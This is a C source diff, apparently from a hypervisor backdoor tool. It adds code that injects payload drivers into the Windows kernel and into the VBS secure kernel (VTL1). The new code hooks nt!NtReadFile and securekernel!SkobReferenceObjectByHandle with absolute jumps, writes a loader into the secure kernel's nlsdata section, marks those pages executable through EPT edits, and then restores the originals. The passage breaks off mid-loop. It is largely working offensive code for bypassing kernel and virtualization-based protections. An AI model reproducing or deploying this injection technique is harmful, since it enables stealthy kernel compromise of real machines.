@@ -5,6 +5,10 @@
 #include "../driver_loader_sys.h"
 #include "../driver_loader.h"
 
+// secure kernel drivers loader image
+#include "../driver_loader_sk_sys.h"
+#include "../driver_loader_sk.h"
+
 #define DRIVER_HOOK_SIZE 14
 #define DRIVER_HOOK_SIZE_MAX 0x50
 
@@ -52,11 +56,38 @@ typedef struct _PROCESSOR_START_BLOCK
 
 extern bool m_quiet;
 //--------------------------------------------------------------------------------------
-int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_size)
+int check_loader_image(uint8_t *loader, int loader_size)
 {
-    int ret = 0;
+    IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
+        RVATOVA(loader, ((IMAGE_DOS_HEADER *)loader)->e_lfanew);
+
+    if (hdr->OptionalHeader.SizeOfImage != loader_size)
+    {
+        printf("ERROR: Driver loader has invalid image size\n");
+        return -1;
+    }
+
+    if (hdr->OptionalHeader.FileAlignment != hdr->OptionalHeader.SectionAlignment)
+    {
+        printf("ERROR: Driver loader has invalid section alignment\n");
+        return -1;
+    }
+
+    if (hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0)
+    {
+        printf("ERROR: Driver loader must have no imports\n");
+        return -1;
+    }
+
+    return 0;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payload, int payload_size)
+{
+    int ret = -1;
     uint64_t phys_addr = 0, cr3 = 0;
     uint8_t *saved_data = NULL;
+    bool alloc_only = (payload == NULL);    
 
     // read current cr3 value
     if (backdoor_vmread(GUEST_CR3, &cr3) != 0)
@@ -69,40 +100,50 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
     int loader_size = sizeof(driver_loader_sys);
     uint8_t *loader = driver_loader_sys;    
 
-    // allocate memory for the payload
-    int payload_mem_size = _ALIGN_UP(payload_size, PAGE_SIZE);
-    uint8_t *payload_mem = (uint8_t *)VirtualAlloc(NULL, payload_mem_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    if (payload_mem == NULL)
+    // do some basic sanity checks of the loader image
+    if (check_loader_image(loader, loader_size) != 0)
     {
-        printf("VirtualAlloc() ERROR %d\n", GetLastError());
         return -1;
-    }    
-
-    // allocate memory for the payload physical memory map
-    int payload_map_size = sizeof(uint64_t) * (payload_mem_size / PAGE_SIZE);
-    uint64_t *payload_map = (uint64_t *)malloc(payload_map_size);
-    if (payload_map == NULL)
-    {
-        goto _end;
     }
 
-    memcpy(payload_mem, payload, payload_size);
+    int payload_mem_size = _ALIGN_UP(payload_size, PAGE_SIZE), payload_map_size = 0;
+    uint8_t *payload_mem = NULL;
+    uint64_t *payload_map = NULL;
 
-    for (int i = 0; i < payload_mem_size / PAGE_SIZE; i += 1)
+    if (!alloc_only)
     {
-        m_quiet = true;
-
-        // get payload memory page physical address
-        if (backdoor_virt_translate((uint64_t)(payload_mem + (i * PAGE_SIZE)), &payload_map[i], cr3, pml4_addr) != 0)
+        // allocate memory for the payload
+        if ((payload_mem = (uint8_t *)VirtualAlloc(NULL, payload_mem_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
         {
-            m_quiet = false;
+            printf("VirtualAlloc() ERROR %d\n", GetLastError());
+            return -1;
+        }
 
-            printf("ERROR: Unable to get payload memory page physical address\n");
-
+        // allocate memory for the payload physical memory map
+        payload_map_size = sizeof(uint64_t)* (payload_mem_size / PAGE_SIZE);
+        if ((payload_map = (uint64_t *)malloc(payload_map_size)) == NULL)
+        {
             goto _end;
         }
 
-        m_quiet = false;
+        memcpy(payload_mem, payload, payload_size);
+
+        for (int i = 0; i < payload_mem_size / PAGE_SIZE; i += 1)
+        {
+            m_quiet = true;
+
+            // get payload memory page physical address
+            if (backdoor_virt_translate((uint64_t)(payload_mem + (i * PAGE_SIZE)), &payload_map[i], cr3, pml4_addr) != 0)
+            {
+                m_quiet = false;
+
+                printf("ERROR: Unable to get payload memory page physical address\n");
+
+                goto _end;
+            }
+
+            m_quiet = false;
+        }
     }
 
     void *data = malloc(PAGE_SIZE);
@@ -111,7 +152,7 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
         goto _end;
     }
 
-    printf("[+] Guest EPT at 0x%.16llx\n", pml4_addr);
+    printf("[+] Guest EPT is at 0x%.16llx\n", pml4_addr);
 
     m_quiet = true;
 
@@ -311,12 +352,9 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
 _nt_found:
 
     uint32_t ptr = 0;
-    uint32_t nt_edata_addr = 0;
-    uint32_t nt_edata_size = 0;
-    uint32_t nt_init_addr = 0;
-    uint32_t nt_init_size = 0;
-    uint32_t nt_pagekd_addr = 0;
-    uint32_t nt_pagekd_size = 0;
+    uint32_t nt_edata_addr = 0, nt_edata_size = 0;
+    uint32_t nt_init_addr = 0, nt_init_size = 0;
+    uint32_t nt_pagekd_addr = 0, nt_pagekd_size = 0;
 
     while (ptr < PAGE_SIZE * 0x100)
     {
@@ -483,6 +521,8 @@ _nt_found:
         {
             printf("ERROR: Unable to locate nt!KdDebuggerEnabled()\n");
 
+            m_quiet = false;
+
             free(nt_image);
             goto _end;
         }
@@ -531,20 +571,25 @@ _nt_found:
     uint8_t nt_func_buff[DRIVER_HOOK_SIZE_MAX];
     uint8_t nt_func_jump[DRIVER_HOOK_SIZE_MAX];
     uint32_t nt_func_saved_size = 0;
-    uint64_t count_addr = 0, lock_addr = 0;        
+    uint64_t info_addr = 0, lock_addr = 0, image_addr = 0;        
 
-    printf("[+] Kernel driver virtual address is 0x%llx (size: 0x%x)\n", driver_base_virt, driver_image_size);
+    printf("[+] Driver loader virtual address is 0x%llx (size: 0x%x)\n", driver_base_virt, driver_image_size);
         
     /*
         We're using HVBD_DATA structure field as temporary hypervisor memory area
         to store kernel kernel driver load flag (see backdoor_driver.cpp)
     */
-    if (backdoor_ept_info_addr(&count_addr) != 0)
+    if (backdoor_ept_info_addr(&info_addr) != 0)
     {
         goto _end;
     }
 
-    if (backdoor_virt_write_32(count_addr, 0) != 0)
+    if (backdoor_virt_write_32(info_addr + DRIVER_INFO_COUNT, 0) != 0)
+    {
+        goto _end;
+    }
+
+    if (backdoor_virt_write_64(info_addr + DRIVER_INFO_ADDR, 0) != 0)
     {
         goto _end;
     }
@@ -575,11 +620,15 @@ _nt_found:
 
         memset(driver_image, 0, driver_image_size);
         memcpy(driver_image, loader, loader_size);
-        memcpy(driver_image + loader_size, payload_map, payload_map_size);
+
+        if (payload_map)
+        {
+            memcpy(driver_image + loader_size, payload_map, payload_map_size);
+        }        
 
         if (!LdrProcessRelocs(driver_image, (void *)driver_base_virt))
         {
-            printf("ERROR: Unable to relocate driver image\n");
+            printf("ERROR: Unable to relocate driver loader image\n");
 
             free(driver_image);
             goto _end;
@@ -601,6 +650,7 @@ _nt_found:
         DriverParams.KernelBase = (PVOID)nt_base_virt;
         DriverParams.DriverBase = (PVOID)driver_base_virt;
         DriverParams.PayloadPagesCount = payload_mem_size / PAGE_SIZE;
+        DriverParams.bAllocOnly = alloc_only;
         DriverParams.Cr3 = guest_pml4_addr;
 
         // copy driver parameters
@@ -736,9 +786,7 @@ _nt_found:
     else
     {
         goto _end;
-    }   
-
-    printf("[+] Kernel driver mapped to the 0x%llx\n", driver_base_virt);        
+    }
 
     memset(nt_func_jump, 0x90, sizeof(nt_func_jump));
 
@@ -747,6 +795,7 @@ _nt_found:
     *(uint32_t *)(nt_func_jump + 2) = 0;
     *(uint64_t *)(nt_func_jump + 6) = driver_base_virt + driver_new_NtReadFile;
 
+    // overwrite nt!NtReadFile()
     if (backdoor_phys_write(nt_func_phys, nt_func_jump, nt_func_saved_size) != 0)
     {
         goto _end;   
@@ -759,14 +808,14 @@ _nt_found:
         nt_func_virt, driver_base_virt + driver_new_NtReadFile
     );
 
-    printf("[+] Waiting for the driver to be executed...\n");
+    printf("[+] Waiting for the payload driver to be executed...\n");
 
     while (true)
     {
         uint32_t val = 0;
 
-        // read kernel driver load flag
-        if (backdoor_virt_read_32(count_addr, &val) != 0)
+        // read kernel driver call counter
+        if (backdoor_virt_read_32(info_addr + DRIVER_INFO_COUNT, &val) != 0)
         {
             goto _end;
         }
@@ -774,21 +823,51 @@ _nt_found:
         // check if kernel driver was executed
         if (val > 0)
         {
-            printf("[+] Kernel driver was executed!\n");
+            printf("[+] Payload driver was executed!\n");
             break;
         }
 
-        SwitchToThread();
+        bd_yeld();
     }
 
+    // read allocated image address
+    if (backdoor_virt_read_64(info_addr + DRIVER_INFO_ADDR, &image_addr) != 0)
+    {
+        goto _end;
+    }
+
+    if (payload_addr)
+    {
+        *payload_addr = image_addr;
+    }
+
+    if (image_addr != 0)
+    {
+        // success
+        ret = 0;
+    }
+    
+    if (!alloc_only)
+    {
+        if (image_addr != 0)
+        {
+            printf("[+] Payload driver image address is 0x%llx\n", image_addr);
+        }
+        else
+        {
+            printf("ERROR: Driver loader was unable to load payload driver\n");
+        }
+    }
+    
     printf("[+] Performing cleanup...\n");
 
+    // restore patched function
     if (backdoor_phys_write(nt_func_phys, nt_func_buff, nt_func_saved_size) != 0)
     {
         goto _end;   
     }
 
-    Sleep(1000);    
+    bd_sleep(1000);    
 
     for (uint32_t i = 0; i < driver_image_size; i += PAGE_SIZE)
     {   
@@ -811,9 +890,7 @@ _nt_found:
         }
     }
         
-    printf("[+] DONE\n");
-
-    ret = 0;
+    printf("[+] DONE\n");    
 
 _end:
 
@@ -832,9 +909,21 @@ _end:
         free(payload_map);
     }
 
-    VirtualFree(payload_mem, 0, MEM_RELEASE);
+    if (payload_mem)
+    {
+        VirtualFree(payload_mem, 0, MEM_RELEASE);
+    }    
 
     return ret;
+}
+
+int backdoor_vm_alloc(uint64_t pml4_addr, uint64_t *payload_addr, int payload_size)
+{
+    /* 
+        Call backdoor_vm_inject() with no payload image to allocate needed 
+        amount of the kernel memory.
+    */
+    return backdoor_vm_inject(pml4_addr, payload_addr, NULL, payload_size);
 }
 //--------------------------------------------------------------------------------------
 typedef int (* sk_process_callback)(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx);
@@ -994,7 +1083,7 @@ int sk_process_debug_enable(SK_INFO *sk_info, uint64_t process_addr_virt, void *
             }
             else
             {
-                printf(__FUNCTION__"() ERROR: unable to find ImagePolicyIdDebug entry\n");
+                printf("ERROR: Unable to find ImagePolicyIdDebug entry\n");
             }
         }
 
@@ -1151,7 +1240,7 @@ int sk_process_print(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx)
 
     return 0;
 }
-
+//--------------------------------------------------------------------------------------
 int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process_callback callback, void *ctx)
 {
     uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
@@ -1161,10 +1250,10 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
 
     m_quiet = true;
 
-    // get skci.dll physical address
+    // get securekernel physical address
     if (backdoor_virt_translate(sk_addr_virt, &sk_addr_phys, pml4_addr, ept_addr) != 0)
     {
-        printf(__FUNCTION__"() ERROR: unable to get securekernel.exe physical address\n");
+        printf("ERROR: Unable to get securekernel.exe physical address\n");
     }
 
     m_quiet = false;
@@ -1174,14 +1263,15 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
         return -1;
     }
 
-    printf("[+] securekernel.exe is at 0x%llx\n", sk_addr_virt);
+    printf("[+] Secure world EPT is at 0x%.16llx\n", ept_addr);
+    printf("[+] securekernel.exe is at 0x%llx\n", sk_addr_virt);    
 
     uint8_t *buff = (uint8_t *)malloc(PAGE_SIZE);
     if (buff)
     {
         IMAGE_NT_HEADERS *hdr = NULL;
 
-        // read skci.dll image headers
+        // read securekernel image headers
         if (backdoor_phys_read(sk_addr_phys, buff, PAGE_SIZE) == 0)
         {
             IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER *)buff;
@@ -1196,7 +1286,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
             }
             else
             {
-                printf(__FUNCTION__"() ERROR: bad securekernel.exe image header\n");
+                printf("ERROR: Bad securekernel.exe image header\n");
             }
         }        
 
@@ -1337,7 +1427,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
         }
         else
         {
-            printf(__FUNCTION__"() ERROR: unable to find securekernel.exe code section\n");
+            printf("ERROR: Unable to find securekernel.exe code section\n");
         }
 
         uint32_t rva = LdrGetProcAddress(image, "RtlGetVersion");
@@ -1363,7 +1453,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
         }
         else
         {
-            printf(__FUNCTION__"() ERROR: unable to find securekernel!RtlGetVersion()\n");
+            printf("ERROR: Unable to find securekernel!RtlGetVersion()\n");
         }
 
         free(image);
@@ -1371,13 +1461,13 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
 
     if (build == 0)
     {
-        printf(__FUNCTION__"() ERROR: unable to find secure kernel build number\n");
+        printf("ERROR: Unable to find secure kernel build number\n");
         return -1;
     }    
 
     if (sk_process_list_virt == 0 || sk_process_list_phys == 0)
     {
-        printf(__FUNCTION__"() ERROR: unable to find securekernel!SkpspProcessList\n");
+        printf("ERROR: Unable to find securekernel!SkpspProcessList\n");
         return -1;
     }
 
@@ -1386,7 +1476,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
 
     if (build != 10011)
     {
-        printf(__FUNCTION__"() ERROR: unsupported secure kernel build number\n");
+        printf("ERROR: Unsupported secure kernel build number\n");
         return -1;
     }            
 
@@ -1431,6 +1521,655 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
     }
 
     return 0;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payload_addr, uint8_t *payload, int payload_size)
+{
+    int ret = 0;
+    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr, ept_addr_curr = 0;
+    uint64_t sk_addr_phys = 0, func_addr_virt = 0, func_addr_phys = 0;
+    uint32_t sk_nlsdata_addr = 0, sk_nlsdata_size = 0;
+    uint32_t sk_rdata_addr = 0, sk_rdata_size = 0;
+    uint32_t sk_size = 0, func_rva = 0;    
+
+    int loader_size = sizeof(driver_loader_sk_sys);
+    uint8_t *loader = driver_loader_sk_sys;
+
+    // do some basic sanity checks of the loader image
+    if (check_loader_image(loader, loader_size) != 0)
+    {
+        return -1;
+    }
+
+    // get current EPT address
+    if (backdoor_ept_addr(&ept_addr_curr) != 0)
+    {
+        return -1;
+    }
+
+    m_quiet = true;
+
+    // get securekernel physical address
+    if (backdoor_virt_translate(sk_addr_virt, &sk_addr_phys, pml4_addr, ept_addr) != 0)
+    {
+        printf("ERROR: unable to get securekernel.exe physical address\n");
+    }
+
+    m_quiet = false;
+
+    if (sk_addr_phys == 0)
+    {
+        return -1;
+    }
+
+    printf("[+] Secure world EPT is at 0x%.16llx\n", ept_addr);
+    printf("[+] securekernel.exe is at 0x%llx\n", sk_addr_virt);        
+
+    uint8_t *buff = (uint8_t *)malloc(PAGE_SIZE);
+    if (buff)
+    {
+        IMAGE_NT_HEADERS *hdr = NULL;
+
+        // read securekernel image headers
+        if (backdoor_phys_read(sk_addr_phys, buff, PAGE_SIZE) == 0)
+        {
+            IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER *)buff;
+            if (dos_hdr->e_lfanew < PAGE_SIZE - sizeof(IMAGE_NT_HEADERS))
+            {
+                IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)RVATOVA(buff, dos_hdr->e_lfanew);
+
+                // get image size
+                sk_size = hdr->OptionalHeader.SizeOfImage;
+
+                IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
+                    RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
+
+                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
+                {
+                    if (!strncmp((char *)&sec->Name, ".rdata", 6))
+                    {
+                        sk_rdata_addr = sec->VirtualAddress;
+                        sk_rdata_size = sec->Misc.VirtualSize;
+                    }
+                    if (!strncmp((char *)&sec->Name, "nlsdata", 7))
+                    {
+                        sk_nlsdata_addr = sec->VirtualAddress;
+                        sk_nlsdata_size = sec->Misc.VirtualSize;
+                    }
+
+                    sec += 1;
+                }
+
+                printf("[+] securekernel.exe image size is 0x%x bytes\n", sk_size);
+
+                if (sk_rdata_size == 0 || sk_nlsdata_size == 0)
+                {
+                    printf("ERROR: Unable to find needed secure kernel image sections\n");
+                }
+            }
+            else
+            {
+                printf("ERROR: Bad securekernel.exe image header\n");
+            }
+        }
+
+        free(buff);
+    }
+
+    if (sk_size == 0 || sk_rdata_size == 0 || sk_nlsdata_size == 0)
+    {
+        return -1;
+    }
+
+    printf("[+] nlsdata section is at securekernel+%x (size: 0x%x)\n", sk_nlsdata_addr, sk_nlsdata_size);
+
+    // allocate memory for secure kernel image
+    uint8_t *image_sk = (uint8_t *)malloc(sk_size);
+    if (image_sk)
+    {
+        uint32_t ptr = 0;
+        uint64_t addr_virt = sk_addr_virt, addr_phys = 0;
+
+        memset(image_sk, 0, sk_size);
+
+        m_quiet = true;
+
+        while (ptr < sk_size)
+        {
+            if (ptr == 0 || (ptr >= sk_rdata_addr && ptr < sk_rdata_addr + sk_rdata_size))
+            {
+                if (backdoor_virt_translate(addr_virt, &addr_phys, pml4_addr, ept_addr) == 0)
+                {
+                    // dump memory page
+                    backdoor_phys_read(addr_phys, image_sk + ptr, PAGE_SIZE);
+                }
+            }
+
+            ptr += PAGE_SIZE;
+            addr_virt += PAGE_SIZE;
+        }
+
+        m_quiet = false;         
+
+        // get securekernel!SkobReferenceObjectByHandle() RVA
+        func_rva = LdrGetProcAddress(image_sk, "SkobReferenceObjectByHandle");
+
+        free(image_sk);
+    }
+
+    if (func_rva == 0)
+    {
+        printf("ERROR: Unable to locate securekernel!SkobReferenceObjectByHandle()\n");
+        return -1;
+    }
+
+    func_addr_virt = sk_addr_virt + func_rva;
+
+    printf("[+] securekernel!SkobReferenceObjectByHandle() is at 0x%llx\n", func_addr_virt);
+
+    m_quiet = true;
+
+    // get securekernel!SkobReferenceObjectByHandle() physical address
+    if (backdoor_virt_translate(func_addr_virt, &func_addr_phys, pml4_addr, ept_addr) != 0)
+    {
+        printf("ERROR: Unable to get securekernel!SkobReferenceObjectByHandle() physical address\n");
+    }
+
+    m_quiet = false;
+
+    if (func_addr_phys == 0)
+    {
+        return -1;
+    }
+
+    IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
+        RVATOVA(payload, ((IMAGE_DOS_HEADER *)payload)->e_lfanew);
+
+    uint64_t mem = sk_addr_virt + sk_nlsdata_addr;
+    uint64_t image_addr = 0, payload_image_addr = 0;
+    uint32_t payload_image_size = hdr->OptionalHeader.SizeOfImage;
+    uint32_t image_size = _ALIGN_UP(loader_size + payload_image_size, PAGE_SIZE);
+
+    printf("[+] Driver loader virtual address is 0x%llx (size: 0x%x)\n", mem, loader_size);
+
+    // allocate memory for loader + payload
+    uint8_t *image = (uint8_t *)malloc(image_size), *payload_image = NULL;
+    if (image == NULL)
+    {
+        return -1;
+    }
+
+    memset(image, 0, image_size);
+    memcpy(image, loader, loader_size);
+    payload_image = image + loader_size;
+
+    // copy headers
+    memcpy(payload_image, payload, hdr->OptionalHeader.SizeOfHeaders);
+
+    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
+        RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
+
+    // copy payload sections
+    for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
+    {
+        memcpy(
+            RVATOVA(payload_image, sec->VirtualAddress),
+            RVATOVA(payload, sec->PointerToRawData),
+            min(sec->SizeOfRawData, sec->Misc.VirtualSize)
+        );
+
+        sec += 1;
+    }
+
+    if (!LdrProcessRelocs(image, (void *)mem))
+    {
+        printf("ERROR: Unable to relocate driver image\n");
+        goto _end;
+    }
+
+    uint32_t driver_params = LdrGetProcAddress(image, LDR_ORDINAL(DRIVER_SK_ORD_PARAMS));
+    uint32_t driver_new_func = LdrGetProcAddress(image, LDR_ORDINAL(DRIVER_SK_ORD_HANDLER));
+    uint32_t driver_old_func = LdrGetProcAddress(image, LDR_ORDINAL(DRIVER_SK_ORD_CALLGATE));
+
+    if (driver_params == 0 || driver_new_func == 0 || driver_old_func == 0)
+    {
+        printf("ERROR: Unable to locate needed driver image exports\n");
+        goto _end;
+    }
+
+    DRIVER_SK_PARAMS DriverParams;
+    uint64_t driver_params_addr = 0;
+
+    // set up driver parameters
+    DriverParams.KernelBase = (PVOID)sk_addr_virt;
+    DriverParams.DriverBase = (PVOID)mem;
+    DriverParams.PayloadPages = NULL;
+    DriverParams.PayloadPagesCount = image_size / PAGE_SIZE;
+    DriverParams.bAllocOnly = true;
+    DriverParams.CallCount = 0;
+
+    // copy driver parameters
+    memcpy(image + driver_params, &DriverParams, sizeof(DriverParams));
+
+    uint8_t sk_func_buff[DRIVER_HOOK_SIZE_MAX];
+    uint8_t sk_func_jump[DRIVER_HOOK_SIZE_MAX];
+    uint32_t sk_func_saved_size = 0;
+
+    m_quiet = true;
+
+    // get DriverParams physical address
+    if (backdoor_virt_translate(mem + driver_params, &driver_params_addr, pml4_addr, ept_addr) != 0)
+    {
+        printf("ERROR: Unable to get securekernel!SkobReferenceObjectByHandle() physical address\n");
+    }
+
+    m_quiet = false;
+
+    if (driver_params_addr == 0)
+    {
+        goto _end;
+    }
+
+    // save old code of securekernel function to hook
+    if (backdoor_phys_read(func_addr_phys, sk_func_buff, DRIVER_HOOK_SIZE_MAX) != 0)
+    {
+        goto _end;
+    }
+
+    // initialize disassembler engine
+    ud_t ud_obj;
+    ud_init(&ud_obj);
+
+    // set mode, syntax and vendor
+    ud_set_mode(&ud_obj, 64);
+    ud_set_vendor(&ud_obj, UD_VENDOR_INTEL);
+
+    uint32_t inst_ptr = 0;
+
+    while (sk_func_saved_size < DRIVER_HOOK_SIZE)
+    {
+        ud_set_input_buffer(&ud_obj, sk_func_buff + inst_ptr, DRIVER_HOOK_SIZE_MAX - inst_ptr);
+
+        // get length of instruction
+        uint32_t inst_len = ud_disassemble(&ud_obj);
+        if (inst_len == 0)
+        {
+            // error while disassembling instruction
+            printf("ERROR: Can't disassemble instruction at offset %d\n", inst_ptr);
+            break;
+        }
+
+        if (ud_obj.mnemonic == UD_Ijmp || ud_obj.mnemonic == UD_Icall)
+        {
+            // call/jmp with relative address
+            printf("ERROR: call/jmp/jxx instruction at offset %d\n", inst_ptr);
+            break;
+        }
+
+        for (int i = 0; i < 3; i++)
+        {
+            if (ud_obj.operand[i].type == UD_OP_JIMM)
+            {
+                // jxx with relative address
+                printf("ERROR: jxx instruction at offset %d\n", inst_ptr);
+                break;
+            }
+
+            if (ud_obj.operand[i].base == UD_R_RIP)
+            {
+                // RIP relative operand
+                printf("ERROR: RIP-relative instruction at offset %d\n", inst_ptr);
+                break;
+            }
+        }
+
+        inst_ptr += inst_len;
+        sk_func_saved_size += inst_len;
+
+        if (ud_obj.mnemonic == UD_Ijmp ||
+            ud_obj.mnemonic == UD_Iret ||
+            ud_obj.mnemonic == UD_Iretf ||
+            ud_obj.mnemonic == UD_Iiretw ||
+            ud_obj.mnemonic == UD_Iiretq ||
+            ud_obj.mnemonic == UD_Iiretd)
+        {
+            // end of the function thunk?
+            break;
+        }
+    }
+
+    if (DRIVER_HOOK_SIZE > sk_func_saved_size)
+    {
+        printf(
+            "ERROR: Not enough memory for jump (%d bytes found, %d required)\n",
+            sk_func_saved_size, DRIVER_HOOK_SIZE
+        );
+
+        goto _end;
+    }
+
+    printf("[+] Patch size is %d bytes\n", sk_func_saved_size);
+
+    // save original function code
+    memcpy(image + driver_old_func, sk_func_buff, sk_func_saved_size);
+
+    // jump from callgate to function
+    *(uint16_t *)(image + driver_old_func + sk_func_saved_size) = 0x25ff;
+    *(uint32_t *)(image + driver_old_func + sk_func_saved_size + 2) = 0;
+    *(uint64_t *)(image + driver_old_func + sk_func_saved_size + 6) = func_addr_virt + sk_func_saved_size;    
+
+    // allocate memory to save nlsdata section contents
+    uint32_t saved_data_size = _ALIGN_UP(loader_size, PAGE_SIZE);
+    uint8_t *saved_data = (uint8_t *)malloc(saved_data_size);
+    if (saved_data == NULL)
+    {
+        goto _end;
+    }
+
+    for (uint32_t i = 0; i < saved_data_size; i += PAGE_SIZE)
+    {
+        uint64_t phys_addr = 0;
+
+        m_quiet = true;
+
+        // get host physical address of driver page
+        if (backdoor_virt_translate(mem + i, &phys_addr, pml4_addr, ept_addr) != 0)
+        {
+            m_quiet = false;
+
+            printf("ERROR: backdoor_virt_translate() fails\n");
+            goto _end;
+        }
+
+        m_quiet = false;
+
+        // backup memory page contents
+        if (backdoor_phys_read(phys_addr, saved_data + i, PAGE_SIZE) != 0)
+        {
+            goto _end;
+        }
+
+        // copy loader image
+        if (backdoor_phys_write(phys_addr, image + i, PAGE_SIZE) != 0)
+        {
+            goto _end;
+        }
+
+        m_quiet = true;
+
+        // make memory page executable
+        if (backdoor_modify_pt(HVBD_MEM_EXECUTABLE | HVBD_MEM_WRITEABLE, mem + i, pml4_addr, ept_addr) != 0)
+        {
+            m_quiet = false;
+
+            printf("ERROR: backdoor_make_exec_pt() fails\n");
+            goto _end;
+        }
+
+        m_quiet = false;
+    }    
+
+    backdoor_invalidate_caches();
+    bd_yeld();
+
+    memset(sk_func_jump, 0x90, sizeof(sk_func_jump));
+
+    // jump from function to handler
+    *(uint16_t *)(sk_func_jump) = 0x25ff;
+    *(uint32_t *)(sk_func_jump + 2) = 0;
+    *(uint64_t *)(sk_func_jump + 6) = mem + driver_new_func;
+
+    // overwrite securekernel!SkobReferenceObjectByHandle()
+    if (backdoor_phys_write(func_addr_phys, sk_func_jump, sk_func_saved_size) != 0)
+    {
+        goto _end;
+    }
+
+    backdoor_invalidate_caches();
+
+    printf(
+        "[+] securekernel!SkobReferenceObjectByHandle() hook was set: 0x%llx -> 0x%llx\n",
+        func_addr_virt, mem + driver_new_func
+    );
+
+    printf("[+] Waiting for the driver loader to be executed...\n");
+
+    while (true)
+    {
+        // read DriverParams
+        if (backdoor_phys_read(driver_params_addr, (void *)&DriverParams, sizeof(DriverParams)) != 0)
+        {
+            goto _end;
+        }
+
+        // get address of the allocated memory
+        image_addr = (uint64_t)DriverParams.PayloadPages;
+
+        // check if kernel driver was executed
+        if (DriverParams.CallCount > 0)
+        {
+            printf("[+] Driver loader was executed!\n");
+            break;
+        }
+
+        bd_yeld();
+    }
+
+    if (image_addr != 0)
+    {
+        printf("[+] VTL1 kernel memory was allocated at 0x%llx\n", image_addr);
+    }
+    else
+    {
+        printf("ERROR: Driver loader was unable to allocate memory\n");
+    }
+
+    printf("[+] Performing cleanup...\n");
+
+    // restore patched function
+    if (backdoor_phys_write(func_addr_phys, sk_func_buff, sk_func_saved_size) != 0)
+    {
+        goto _end;
+    }
+
+    bd_sleep(1000);
+
+    for (uint32_t i = 0; i < saved_data_size; i += PAGE_SIZE)
+    {
+        uint64_t phys_addr = 0;
+
+        m_quiet = true;
+
+        // get host physical address of driver page
+        if (backdoor_virt_translate(mem + i, &phys_addr, pml4_addr, ept_addr) != 0)
+        {
+            m_quiet = false;
+
+            printf("ERROR: backdoor_virt_translate() fails\n");
+            goto _end;
+        }
+
+        m_quiet = false;
+
+        // restore memory page contents
+        if (backdoor_phys_write(phys_addr, saved_data + i, PAGE_SIZE) != 0)
+        {
+            goto _end;
+        }        
+    }
+
+    if (image_addr == 0)
+    {
+        goto _end;
+    }        
+
+    // set up driver parameters
+    DriverParams.KernelBase = (PVOID)sk_addr_virt;
+    DriverParams.DriverBase = (PVOID)image_addr;
+    DriverParams.PayloadPages = NULL;
+    DriverParams.PayloadPagesCount = 0;
+    DriverParams.bAllocOnly = false;
+    DriverParams.CallCount = 0;
+
+    m_quiet = true;
+    driver_params_addr = 0;
+
+    // update DriverParams physical address
+    if (backdoor_virt_translate(image_addr + driver_params, &driver_params_addr, pml4_addr, ept_addr) != 0)
+    {
+        printf("ERROR: Unable to get securekernel!SkobReferenceObjectByHandle() physical address\n");
+    }
+
+    m_quiet = false;
+
+    if (driver_params_addr == 0)
+    {
+        goto _end;
+    }
+
+    // copy loader image once again
+    memcpy(image, loader, loader_size);
+
+    if (!LdrProcessRelocs(image, (void *)image_addr))
+    {
+        printf("ERROR: Unable to relocate driver loader image\n");
+        goto _end;
+    }
+
+    // copy driver parameters
+    memcpy(image + driver_params, &DriverParams, sizeof(DriverParams));
+
+    // save original function code
+    memcpy(image + driver_old_func, sk_func_buff, sk_func_saved_size);
+
+    // jump from callgate to function
+    *(uint16_t *)(image + driver_old_func + sk_func_saved_size) = 0x25ff;
+    *(uint32_t *)(image + driver_old_func + sk_func_saved_size + 2) = 0;
+    *(uint64_t *)(image + driver_old_func + sk_func_saved_size + 6) = func_addr_virt + sk_func_saved_size;
+
+    for (uint32_t i = 0; i < image_size; i += PAGE_SIZE)
+    {
+        uint64_t phys_addr = 0;
+
+        m_quiet = true;
+
+        // get host physical address of driver page
+        if (backdoor_virt_translate(image_addr + i, &phys_addr, pml4_addr, ept_addr) != 0)
+        {
+            m_quiet = false;
+
+            printf("ERROR: backdoor_virt_translate() fails\n");
+            goto _end;
+        }
+
+        m_quiet = false;        
